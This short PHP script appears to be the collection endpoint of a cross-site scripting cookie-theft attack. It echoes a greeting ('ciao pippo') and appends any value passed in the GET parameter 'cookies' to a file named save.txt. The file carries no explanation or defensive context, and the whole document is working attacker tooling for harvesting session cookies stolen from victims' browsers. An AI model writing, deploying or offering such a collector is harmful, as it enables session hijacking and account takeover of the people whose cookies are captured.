<?php

	echo "ciao pippo";
	$fp = fopen("save.txt","a");
	fwrite($fp, $_GET['cookies'] . "\n\n");
	fclose($fp);

?>
